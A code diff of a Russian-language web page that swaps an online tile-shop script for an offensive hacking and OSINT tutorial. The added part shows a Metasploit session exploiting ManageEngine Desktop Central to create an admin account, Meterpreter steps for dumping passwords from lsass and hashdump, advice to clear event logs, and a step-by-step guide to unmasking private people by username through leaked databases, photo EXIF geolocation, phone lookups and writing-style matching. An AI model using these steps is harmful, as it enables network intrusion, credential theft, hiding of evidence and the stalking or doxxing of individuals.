+                <span class="prompt">msf6 exploit(manageengine_desktopcentral_admin_creat)</span> > <span class="cmd">set RPORT 8022</span><br>
+                <span class="prompt">msf6 exploit(manageengine_desktopcentral_admin_creat)</span> > <span class="cmd">set TARGETURI /</span><br>
+                <span class="prompt">msf6 exploit(manageengine_desktopcentral_admin_creat)</span> > <span class="cmd">exploit</span><br>
+                <span style="color: #0f9;">[+] Administrator account 'metasploit' created</span><br>
+                <span style="color: #0f9;">[*] Now you can login and deploy custom agents</span>
+            </div>
+        </div>
+        <p>⚙️ После эксплуатации ты можешь легитимно войти в веб-консоль Desktop Central и развернуть свои пэйлоады на всех управляемых агентах — это почти полный контроль над всей сетью предприятия.</p>
+        
+        <!-- БОНУСНЫЙ БЛОК: УКРАДИ КРЕДЫ ИЗ ПАМЯТИ -->
+        <h4 style="color: #fff; margin-top: 30px;">🧠 POST-ЭКСПЛУАТАЦИЯ: Миграция и дамп паролей (Meterpreter)</h4>
+        <p>Как только получил meterpreter — не останавливайся. Мигрируй в системный процесс и вытаскивай хэши:</p>
+        <div class="terminal-window">
+            <div class="terminal-body">
+                <span class="prompt">meterpreter></span> <span class="cmd">ps</span><br>
+                <span class="prompt">meterpreter></span> <span class="cmd">migrate -N lsass.exe</span><br>
+                <span class="prompt">meterpreter></span> <span class="cmd">load kiwi</span><br>
+                <span class="prompt">meterpreter></span> <span class="cmd">creds_all</span><br>
+                <span style="color: #0f9;">[+] Dumped NTLM hashes and plaintext passwords from memory</span><br>
+                <span class="prompt">meterpreter></span> <span class="cmd">hashdump</span><br>
+                <span style="color: #0f9;">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+            </div>
+        </div>
+        <p class="meta-box" style="margin-top: 15px;">💡 <strong>Совет профи:</strong> Всегда делай <span class="cmd">background</span> текущей сессии и запускай <span class="cmd">sessions -u</span> для апгрейда до meterpreter, если попал через шелл. И не забывай чистить логи (<span class="cmd">clearev</span>).</p>
+    </div>
+    <!-- КОНЕЦ НОВОГО РАСШИРЕННОГО БЛОКА ПОРТОВ -->
+</div>
+
+        <div class="module scroll-anim">
+            <h2>0x05: Мануал по скриншотам (Метод Шерлока)</h2>
+            <p>Один скриншот — это тысячи слов. Чтобы найти человека по картинке, нужно быть внимательным к мелочам:</p>
+            <ul>
+                <li><strong>Часы и Батарея:</strong> Процент заряда и время помогают понять, как давно был сделан кадр и в каком часовом поясе живет цель.</li>
+                <li><strong>Иконки связи:</strong> Значок "VoLTE" или специфический вид иконки Wi-Fi подскажут модель телефона или версию Android.</li>
+                <li><strong>Тени и Отражения:</strong> В отражении экрана или очков можно увидеть комнату, вид из окна или даже лицо того, кто делает скриншот.</li>
+                <li><strong>Банковские приложения:</strong> Даже край иконки приложения банка может выдать страну (Сбербанк — РФ, Kaspi — Казахстан и т.д.).</li>
+            </ul>
+        </div>
+
+        <!-- ========== НОВЫЕ РАСШИРЕННЫЕ РАЗДЕЛЫ (НЕ УДАЛЕНО, НЕ ИЗМЕНЕНО, ТОЛЬКО ДОБАВЛЕНО) ========== -->
+
+        <div class="module scroll-anim">
+            <h2>0x06: Поиск физического аккаунта по Username</h2>
+            <div class="meta-box">
+                «Физический аккаунт» — это не просто ник в соцсети, а привязка к реальному человеку: номер телефона, паспортные данные, геолокация, место работы или учёбы. Имея только юзернейм, можно выйти на эти данные через цепочку утечек и открытых источников.
+            </div>
+            
+            <p><strong>Шаг 1. Сбор всех возможных связей ника</strong><br>
+            Используй <strong>Sherlock</strong> или <strong>Maigret</strong> (уже был выше) — они покажут, где засветился юзернейм. Затем вручную проверь: Telegram (@username), VK (https://vk.com/username), Instagram, Twitter, TikTok, Discord, GitHub. На многих платформах можно увидеть <strong>реальное имя</strong> или <strong>email</strong> в разделе "о себе".</p>
+
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div>
+                    <div class="terminal-title">bash — osint-merge</div>
+                </div>
+                <div class="terminal-body">
+                    <span class="prompt">user@kali</span>:<span class="path">~</span>$ <span class="cmd">sherlock TargetNick</span><br>
+                    <span style="color: #0f9;">[+] Telegram: https://t.me/TargetNick (phone hidden, but bio: 'Sysadmin from SPb')</span><br>
+                    <span style="color: #0f9;">[+] GitHub: commits with email target@pm.me</span><br>
+                    <span style="color: #ffaa00;">[!] Email found → дальнейший поиск по email (holehe, dehashed)</span>
+                </div>
+            </div>
+
+            <p><strong>Шаг 2. От email к телефону и имени</strong><br>
+            Пробиваем email через <strong>holehe</strong> (покажет, на каких сервисах зарегистрирован email). Если email слит в утечку (например, Collection #1, Adobe, LinkedIn), используй <strong>DeHashed</strong> или <strong>LeakCheck</strong> — там могут быть пароли, а главное — <strong>номер телефона</strong> и <strong>хеш паспорта</strong>. Номер телефона затем ищем в Telegram (боты типа @get_id_bot), WhatsApp, Viber — иногда стоит аватарка с лицом.</p>
+            
+            <p><strong>Шаг 3. Геолокация через посты и фото</strong><br>
+            Проверь все фото, которые выложил пользователь с этим ником. Скачай оригиналы и посмотри <strong>EXIF-метаданные</strong> (команда <strong>exiftool</strong> в Linux). Могут быть GPS-координаты, модель камеры, дата. Даже если GPS стёрт, иногда остаётся <strong>ID дома</strong> (например, в фото с iPhone сохраняется регион).<br>
+            Анализируй текст постов: упоминания кафе, станций метро, местных мероприятий. Используй Google Dorks: <code>site:instagram.com "TargetNick" место</code>.</p>
+
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div>
+                    <div class="terminal-title">exiftool target.jpg</div>
+                </div>
+                <div class="terminal-body">
+                    <span style="color:#aaa;">GPS Position : 55.751244, 37.618423 (Moscow, Red Square area)</span><br>
+                    <span style="color:#aaa;">Create Date : 2025:08:15 14:23:11</span><br>
+                    <span style="color:#0f0;">→ Вероятно, цель была в центре Москвы в августе 2025</span>
+                </div>
+            </div>
+
+            <p><strong>Шаг 4. Поиск по номеру телефона</strong><br>
+            Если ты получил номер телефона, используй <strong>GetContact</strong> (Android/Web версии) — там люди сами подписывают, как записан контакт (часто реальное имя). Также проверь, привязан ли номер к профилю в Telegram, WhatsApp (через добавление в контакты). Некоторые сервисы (например, <strong>Numbuster</strong>) определяют оператора и регион.</p>
+            
+            <a href="https://github.com/sherlock-project/sherlock" class="btn-link">Sherlock</a>
+            <a href="https://github.com/megadose/holehe" class="btn-link">Holehe</a>
+            <a href="https://dehashed.com/" class="btn-link">DeHashed</a>
+        </div>
+
+        <div class="module scroll-anim">
+            <h2>0x07: Психолингвистика и стилометрия — найти человека по манере общения</h2>
+            <div class="meta-box">
+                Даже если человек использует разные ники, аватарки и email, он остаётся собой — его уникальный «словесный отпечаток» (стиль, лексика, ошибки, эмодзи, время постов) выдаёт его на любой платформе. Это называется <strong>стилометрия</strong>.
+            </div>
+
+            <p><strong>Признаки, которые нельзя скрыть:</strong></p>
+            <ul>
+                <li><strong>Уникальные слова-паразиты и междометия:</strong> «кста», «хз», «ага», «нууу», «жесть», «imho» — каждый человек имеет свой набор.</li>
+                <li><strong>Пунктуация и капс:</strong> кто-то ставит многоточие в конце каждого сообщения... Другой пишет ВСЕГДА КАПСОМ или, наоборот, без заглавных букв. Кто-то не ставит пробел после запятой,а это сразу бросается в глаза.</li>
+                <li><strong>Эмодзи-почерк:</strong> один человек использует только 🤔😂🔥, другой — 🥸🧠🕵️. Стиль комбинирования эмодзи уникален.</li>
+                <li><strong>Время активности:</strong> если на форуме A пользователь пишет каждый день в 23:00-02:00, а на форуме B — тоже ночью по тому же часовому поясу, это сильный маркер.</li>
+                <li><strong>Опечатки и их тип:</strong> одни постоянно путают «тся/ться», другие — «ие/ее». Автоматические переводчики выдают одинаковые ошибки.</li>
+                <li><strong>Длина сообщений и среднее количество слов:</strong> болтуны пишут простыни, лаконичные люди — 3-5 слов.</li>
+            </ul>
+
+            <div class="meta-box">
+                <strong>Практический кейс:</strong> У тебя есть подозреваемый с ником «Xaos_77» на одном трекер-форуме. На другом ресурсе он зарегистрирован как «Hunter_Zero» — ники не пересекаются. Но на обоих ресурсах он:<br>
+                • пишет «патамушта» вместо «потому что»<br>
+                • всегда ставит смайлик «:3» после вопроса<br>
+                • использует даш (-) вместо длинного тире и обожает слово «карл!»<br>
+                → Вероятность, что это один человек — более 90%.
+            </div>
+
+            <p><strong>Инструменты для автоматической стилометрии:</strong></p>
+            <ul>
+                <li><strong>JStylo / Anonymouth</strong> — анализ стиля текста, сравнение авторства.</li>
+                <li><strong>GitHub Copilot для OSINT</strong> — можно скормить нейросети (например, GPT) несколько сообщений и спросить: «Оцени, похож ли этот текст на автора вот этих?»</li>
+                <li><strong>Метод «контрольных фраз»</strong>: задай на разных платформах один и тот же вопрос цели (например, «Какой твой любимый фильм?»). Если ответы совпадают по структуре — совпадение.</li>
+            </ul>
+
+            <p><strong>Как тренировать наблюдательность:</strong> Выбери любого своего знакомого. Найди его в двух разных соцсетях (даже если ники разные). Составь список из 10 стилистических черт (эмодзи, ошибки, частота использования тире, приветствия). Ты увидишь, что даже в официальном LinkedIn он пишет так же, как в анонимном Telegram-канале. Эта «суперсила» позволяет деанонимизировать человека без единого технического инструмента.</p>
+            
+            <a href="https://github.com/bcattle/jstylo" class="btn-link">JStylo</a>
+            <a href="https://anonymous-profiles.herokuapp.com/" class="btn-link">Anonymouth</a>
+        </div>
+
+        <!-- Дополнительный компактный блок с чек-листом, не нарушающий структуру -->
+        <div class="module scroll-anim">
+            <h2>0x08: Чек-лист OSINT-архитектора</h2>
+            <p>Короткая памятка, чтобы ничего не упустить:</p>
+            <ul>
+                <li>✅ Собрать все платформы по нику (Maigret/Sherlock).</li>
+                <li>✅ Извлечь email, телефон, фото, реальное имя из найденных профилей.</li>
+                <li>✅ Пробить email через holehe и leak-базы.</li>
+                <li>✅ Проанализировать EXIF-данные всех изображений.</li>
+                <li>✅ Сравнить стиль общения на разных аккаунтах (даже если ники разные).</li>
+                <li>✅ Использовать Google Dorks: <code>intitle:никнейм</code>, <code>inurl:никнейм</code>, <code>filetype:pdf "никнейм"</code>.</li>
+                <li>✅ Проверить архивы Wayback Machine (archive.org) — старые страницы часто хранят удалённые данные.</li>
+            </ul>
+        </div>
+
     </div>
 
     <script>
-        // ==================== НАСТРОЙКИ BARK УВЕДОМЛЕНИЙ ====================
-        // Bark API endpoint (официальный сервер)
-        const BARK_API_URL = "https://api.day.app";
-        // ⚠️ ВСТАВЬТЕ ВАШ КЛЮЧ ИЗ ПРИЛОЖЕНИЯ BARK (скопируйте после регистрации устройства)
-        const BARK_DEVICE_KEY = "https://api.day.app/2mfG6468JsmXaVLaLETob";
-        // URL вашего Google Apps Script (вебхук для получения статуса подтверждения)
-        const GAS_WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbyaJRI_mPw0mLaRtiX6wTvWfsXt6UWR_T4TvQMC0oFC-riAMem9vHw3jBJ5amrU8zf7/exec";
-        
-        // Функция отправки уведомления через Bark
-        async function sendBarkNotification(title, body, orderId) {
-            // URL для GET-запроса к Bark API [citation:10]
-            // Формат: /{device_key}/{title}/{body}?url={callback_url}
-            // URL нужно закодировать, чтобы передать параметры [citation:8]
-            const callbackUrl = `${window.location.origin}?confirm=${orderId}`;
-            const encodedCallback = encodeURIComponent(callbackUrl);
-            const encodedTitle = encodeURIComponent(title);
-            const encodedBody = encodeURIComponent(body);
-            
-            // Добавляем параметры: level=timeSensitive (для срочных уведомлений), group, url
-            const url = `${BARK_API_URL}/${BARK_DEVICE_KEY}/${encodedTitle}/${encodedBody}?level=timeSensitive&group=Заказы&url=${encodedCallback}&automaticallyCopy=1`;
-            
-            try {
-                console.log("Отправка Bark уведомления:", url);
-                const response = await fetch(url, { mode: 'no-cors' });
-                console.log("Bark уведомление отправлено");
-                return true;
-            } catch (err) {
-                console.error("Ошибка отправки Bark:", err);
-                throw err;
-            }
-        }
-        
-        // Сохраняем статус заказа в Google Apps Script
-        async function setOrderStatus(orderId, status) {
-            await fetch(GAS_WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ orderId, status, action: 'set' })
-            });
-        }
-        
-        async function getOrderStatus(orderId) {
-            const res = await fetch(`${GAS_WEBHOOK_URL}?orderId=${orderId}&action=get`);
-            const data = await res.json();
-            return data.status; // 'pending', 'approved', 'rejected'
-        }
-        // =================================================================
+        const nick = "EliteArchangel";
+        const container = document.getElementById('nickname-assembly');
 
-        const ITEM_PRICE = 6600;
-        let client = JSON.parse(localStorage.getItem('dolwall_user')) || null;
-        let cart = [];
-        let currentOrderId = null;
-        let statusPoller = null;
+        // Сборка ника
+        nick.split('').forEach((char, i) => {
+            const span = document.createElement('span');
+            span.textContent = char;
+            span.className = 'letter-unit';
+            span.style.setProperty('--dx', (Math.random() * 1000 - 500) + 'vw');
+            span.style.setProperty('--dy', (Math.random() * 1000 - 500) + 'vh');
+            span.style.animationDelay = (i * 0.1) + 's';
+            container.appendChild(span);
+        });
 
-        const products = [
-            { id: 1, name: "Черное золото", type: "Глянцевый", img: "https://img.freepik.com/premium-vector/black-golden-marble-background-with-smudge-grey-effect-abstract-background_1051181-845.jpg" },
-            { id: 2, name: "Классик Голд", type: "Глянцевый", img: "https://img.santehnica.ru/files/images/resized/products/1/4/14141410-keramicheskaya-plitka-newtrend-intensity-light-wt36its15-30-x-60-sm-glyantsevaya-tsvet-beliy.1200x1200.jpg" },
-            { id: 3, name: "Тянь Шань", type: "Мрамор", img: "https://conceptceramic.ru/image/catalog/product/284/314625.jpg" },
-            { id: 4, name: "Гранит", type: "Натуральный", img: "https://ir.ozone.ru/s3/multimedia-1-h/w1200/7077049289.jpg" },
-            { id: 5, name: "Юпитер матовый", type: "Матовый", img: "https://www.grouppartner.ru/upload/iblock/255/q3c2fmutdj8028yfzasd0tol4ah6t3nk.jpeg" },
-            { id: 6, name: "Роял матовый", type: "Матовый", img: "https://гибкий-стиль.рф/image/cache/catalog/tov-new/royal-400x600.jpeg" },
-            { id: 7, name: "Оникс матовый", type: "Матовый", img: "https://гибкий-стиль.рф/image/cache/catalog/tov-new/onix-400x600.jpeg" },
-            { id: 8, name: "Капучино матовый", type: "Матовый", img: "https://гибкий-стиль.рф/image/cache/catalog/tov-new/capucino-400x600.jpeg" },
-            { id: 9, name: "Нежность", type: "Глянцевый", img: "https://гибкий-стиль.рф/image/cache/catalog/tov-new/nezhnost-400x600.jpeg" },
-            { id: 10, name: "Млечный путь", type: "Глянцевый", img: "https://ekaterinburg.novayaplitka.ru/upload/iblock/e8a/0jyyfdtel0zyutlkyy10no12apngd2ec.jpg" },
-            { id: 11, name: "Грация", type: "Мрамор", img: "https://avatars.mds.yandex.net/get-goods_pic/14294964/hat4bd9cb453d8e3cf2d9616b6f0a002aa6/orig" },
-            { id: 12, name: "Зебра", type: "Дизайнерский", img: "https://гибкий-стиль.рф/image/cache/catalog/tov-new/zebra-400x600.jpeg" },
-            { id: 13, name: "Олимп", type: "Мрамор", img: "https://avatars.mds.yandex.net/get-goods_pic/8171279/hatf41e07c6db79fe3a67504d18db95a07f/orig" },
-            { id: 14, name: "Луна матовый", type: "Матовый", img: "https://avatars.mds.yandex.net/get-goods_pic/12824671/hat9d0e5ad877b6af971e5bb0a8c6139064/orig" },
-            { id: 15, name: "Сильвер", type: "Глянцевый", img: "https://avatars.mds.yandex.net/get-goods_pic/6691814/hatb9964c8c57e4f437e1c4b815677e3b19/orig" },
-            { id: 16, name: "Классик", type: "Глянцевый", img: "https://avatars.mds.yandex.net/get-goods_pic/15224382/hatf9f2c4516e58183c79ccd5b36e9dff85/orig" },
-            { id: 17, name: "Серафинид", type: "Мрамор", img: "https://гибкий-стиль.рф/image/cache/catalog/tov-new/serafinit-400x600.jpeg" },
-            { id: 18, name: "Плутон матовый", type: "Матовый", img: "https://гибкий-стиль.рф/image/cache/catalog/tov-new/pluton-1200x800.jpeg" },
-            { id: 19, name: "Лагуна матовая", type: "Матовый", img: "https://гибкий-стиль.рф/image/cache/catalog/tov-new/laguna-400x600.jpeg" },
-            { id: 20, name: "Белый Мрамор", type: "Классика", img: "https://гибкий-стиль.рф/image/cache/catalog/tov-new/royal-1200x800.jpeg" },
-        ];
+        // Последовательность интро (ФИКС БЕЛОГО ЭКРАНА)
+        document.addEventListener('DOMContentLoaded', () => {
+            const portal = document.getElementById('portal');
+            const flash = document.getElementById('flash-cs2');
+            const intro = document.getElementById('intro-screen');
 
-        window.onload = () => {
-            if(client) {
-                document.getElementById('introScreen').style.display = 'none';
-                document.getElementById('mainUI').classList.remove('hidden');
-                document.body.classList.remove('no-scroll');
-                renderCatalog();
-            }
-        };
-
-        function startSystem() {
-            const intro = document.getElementById('introScreen');
-            intro.classList.add('fade-out');
             setTimeout(() => {
-                intro.style.display = 'none';
-                if(!client) {
-                    document.getElementById('regModal').classList.add('active');
-                } else {
-                    document.getElementById('mainUI').classList.remove('hidden');
-                    document.body.classList.remove('no-scroll');
-                    renderCatalog();
-                }
-            }, 1200);
-        }
+                flash.classList.add('bang');
+                setTimeout(() => {
+                    intro.style.display = 'none';
+                    portal.style.display = 'block';
+                    
+                    const observer = new IntersectionObserver((entries) => {
+                        entries.forEach(entry => {
+                            if (entry.isIntersecting) {
+                                entry.target.classList.add('active');
+                            }
+                        });
+                    }, { threshold: 0.1 });
 
-        function completeReg() {
-            const data = {
-                ln: document.getElementById('userLName').value.trim(),
-                fn: document.getElementById('userFName').value.trim(),
-                ph: document.getElementById('userPhone').value.trim(),
-                ad: document.getElementById('userAddr').value.trim()
-            };
-            if(!data.ln || !data.fn || !data.ph || !data.ad) {
-                notify("Заполните все данные для доставки!");
-                return;
-            }
-            client = data;
-            localStorage.setItem('dolwall_user', JSON.stringify(client));
-            document.getElementById('regModal').classList.remove('active');
-            document.getElementById('mainUI').classList.remove('hidden');
-            document.body.classList.remove('no-scroll');
-            renderCatalog();
-            notify("Доступ открыт!");
-        }
-
-        function renderCatalog() {
-            const grid = document.getElementById('catalogGrid');
-            grid.innerHTML = '';
-            products.forEach((p, idx) => {
-                grid.innerHTML += `
-                    <div class="product-card" style="animation-delay: ${idx * 0.08}s">
-                        <div class="product-price">6.600₽</div>
-                        <div class="product-img" style="background-image: url('${p.img}')"></div>
-                        <div class="product-body">
-                            <h3>${p.name}</h3>
-                            <p style="color: #aaa; margin-bottom: 15px; font-weight: 500; text-transform: uppercase; font-size: 0.8rem; letter-spacing: 1px;">${p.type} • 3.4 м²</p>
-                            <button class="product-btn" onclick="addToCart(${p.id})">Добавить в корзину</button>
-                        </div>
-                    </div>
-                `;
-            });
-        }
-
-        function notify(msg) {
-            const box = document.getElementById('toastBox');
-            const toast = document.createElement('div');
-            toast.className = 'toast';
-            toast.innerHTML = `<i class="fa-solid fa-bell-concierge" style="color: var(--gold)"></i> ${msg}`;
-            box.appendChild(toast);
-            setTimeout(() => toast.remove(), 4000);
-        }
-
-        function addToCart(id) {
-            const prod = products.find(x => x.id === id);
-            cart.push(prod);
-            updateCartUI();
-            notify(`"${prod.name}" добавлен`);
-        }
-
-        function updateCartUI() {
-            document.getElementById('cartCount').innerText = cart.length;
-            document.getElementById('cartTotalSum').innerText = (cart.length * ITEM_PRICE).toLocaleString() + '₽';
-        }
-
-        function toggleCart() {
-            document.getElementById('cartBox').classList.toggle('open');
-            renderCartItems();
-        }
-
-        function renderCartItems() {
-            const container = document.getElementById('cartItems');
-            container.innerHTML = '';
-            let groups = {};
-            cart.forEach(p => groups[p.name] = (groups[p.name] || 0) + 1);
-            for(let name in groups) {
-                container.innerHTML += `
-                    <div class="cart-item">
-                        <div>
-                            <b style="font-size: 1.2rem; font-weight: 800;">${name}</b><br>
-                            <span style="color: var(--gold); font-weight: 700;">${groups[name]} шт. x 6.600₽</span>
-                        </div>
-                        <i class="fa-solid fa-trash-can" style="color: #ff4757; cursor: pointer; font-size: 1.5rem;" onclick="removeFromCart('${name}')"></i>
-                    </div>
-                `;
-            }
-        }
-
-        function removeFromCart(name) {
-            cart = cart.filter(x => x.name !== name);
-            updateCartUI();
-            renderCartItems();
-        }
-
-        async function sendOrder() {
-            if(cart.length === 0) return notify("Корзина пуста!");
-            
-            // Проверяем, что ключ Bark вставлен
-            if(BARK_DEVICE_KEY === "СКОПИРУЙТЕ_КЛЮЧ_ИЗ_ПРИЛОЖЕНИЯ_И_ВСТАВЬТЕ_СЮДА") {
-                notify("⚠️ Сначала настройте Bark: скопируйте ключ из приложения и вставьте в код!");
-                return;
-            }
-            
-            const orderId = Math.floor(Math.random() * 89999) + 10000;
-            currentOrderId = orderId;
-            const totalSum = cart.length * ITEM_PRICE;
-            
-            let itemsList = '';
-            let groups = {};
-            cart.forEach(p => groups[p.name] = (groups[p.name] || 0) + 1);
-            for(let name in groups) {
-                itemsList += `▫️ ${name}: ${groups[name]} шт.\n`;
-            }
-            
-            // Формируем заголовок и тело уведомления для Bark
-            const notificationTitle = `🪨 НОВЫЙ ЗАКАЗ #${orderId}`;
-            const notificationBody = `${client.fn}\n💰 ${totalSum.toLocaleString()}₽\n📦 ${cart.length} шт.\n\nНажмите для подтверждения`;
-            
-            // Отправляем уведомление через Bark
-            try {
-                await sendBarkNotification(notificationTitle, notificationBody, orderId);
-                notify("Уведомление отправлено менеджеру через Bark!");
-            } catch(err) {
-                notify("Не удалось отправить уведомление. Проверьте ключ Bark.");
-                return;
-            }
-            
-            // Сохраняем статус заказа (pending)
-            await setOrderStatus(orderId, 'pending');
-            
-            // Показываем модальное окно ожидания
-            document.getElementById('statusModal').classList.add('active');
-            document.getElementById('waitBox').classList.remove('hidden');
-            document.getElementById('successBox').classList.add('hidden');
-            document.getElementById('rejectedBox').classList.add('hidden');
-            
-            // Начинаем опрос статуса (как админ нажмёт на уведомление)
-            if(statusPoller) clearInterval(statusPoller);
-            statusPoller = setInterval(async () => {
-                try {
-                    const status = await getOrderStatus(orderId);
-                    if(status === 'approved') {
-                        clearInterval(statusPoller);
-                        document.getElementById('waitBox').classList.add('hidden');
-                        document.getElementById('successBox').classList.remove('hidden');
-                        cart = [];
-                        updateCartUI();
-                        const cartSidebar = document.getElementById('cartBox');
-                        if(cartSidebar.classList.contains('open')) cartSidebar.classList.remove('open');
-                        notify("Заказ подтверждён! Спасибо за покупку!");
-                    } else if(status === 'rejected') {
-                        clearInterval(statusPoller);
-                        document.getElementById('waitBox').classList.add('hidden');
-                        document.getElementById('rejectedBox').classList.remove('hidden');
-                        notify("Заказ отклонён менеджером.");
-                    }
-                } catch(e) { console.warn(e); }
-            }, 4000);
-            
-            // Таймаут 10 минут
-            setTimeout(() => {
-                if(statusPoller) {
-                    clearInterval(statusPoller);
-                    if(document.getElementById('waitBox').classList.contains('hidden')) return;
-                    notify("Время ожидания истекло. Менеджер свяжется с вами.");
-                    document.getElementById('statusModal').classList.remove('active');
-                }
-            }, 600000);
-        }
+                    document.querySelectorAll('.module').forEach(m => observer.observe(m));
+                }, 250); 
+            }, 3000); 
+        });
     </script>
 </body>
 </html>
